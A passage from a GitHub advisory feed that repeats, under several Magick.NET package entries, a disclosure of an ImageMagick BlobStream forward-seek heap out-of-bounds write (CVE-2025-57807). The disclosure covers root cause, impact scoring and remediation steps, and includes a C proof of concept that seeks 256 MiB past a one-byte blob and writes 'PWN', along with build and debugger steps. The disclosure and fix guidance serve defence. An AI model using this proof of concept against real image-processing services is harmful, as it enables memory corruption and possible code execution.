<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-OpenMP-arm64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-arm64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
